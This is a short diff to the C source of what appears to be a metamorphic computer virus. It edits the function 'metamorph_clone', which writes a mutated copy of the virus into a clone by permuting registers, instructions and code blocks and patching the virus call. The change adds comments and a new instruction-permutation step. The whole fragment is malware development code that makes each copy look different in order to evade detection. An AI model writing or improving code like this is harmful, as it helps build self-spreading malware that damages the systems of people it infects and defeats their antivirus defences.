@@ -134,12 +134,12 @@ bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off,
 			uint64_t seed, size_t *full_virus_size,
 			const struct virus_header *vhdr)
 {
-	struct safe_ptr	loader_ref;
-	struct safe_ptr	virus_ref;
-	struct safe_ptr	virus_buffer_ref;
-	size_t		virus_buffer_size;
-	void		*clone_virus_address;
-	int32_t		clone_virus_address_shift = 0;
+	struct safe_ptr	loader_ref;                                             // loader reference in clone (mutable)
+	struct safe_ptr	virus_ref;                                              // virus reference in clone (mutable)
+	struct safe_ptr	virus_buffer_ref;                                       // virus buffer reference; filled by permutate_blocks
+	size_t		virus_buffer_size;                                      // virus size in virus_buffer_ref
+	void		*clone_virus_address;                                   // virus address in clone_ref
+	int32_t		clone_virus_address_shift = 0;                          // virus address shift in clone_ref
 	size_t		loader_size         = vhdr->loader_size;
 	size_t		dist_virus_loader   = vhdr->dist_virus_loader;
 	size_t		dist_vircall_loader = vhdr->dist_vircall_loader;
@@ -150,6 +150,7 @@ bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off,
 	|| !get_clone_virus_address(&clone_virus_address, clone_ref, loader_off, dist_vircall_loader)
 	|| !set_virus_buffer_size(&virus_buffer_size, virus_ref.size)
 	|| !permutate_registers(loader_ref, seed)
+	|| !permutate_instructions(virus_ref, seed)
 	|| !permutate_blocks(virus_ref, virus_buffer_ref, &virus_buffer_size, clone_virus_address, &clone_virus_address_shift, seed)
 	|| !set_clone_virus_call(clone_ref, loader_off, dist_vircall_loader, clone_virus_address_shift)
 	|| !copy_virus_buffer_to_clone(clone_ref, loader_off, dist_virus_loader, virus_buffer_ref, virus_buffer_size)
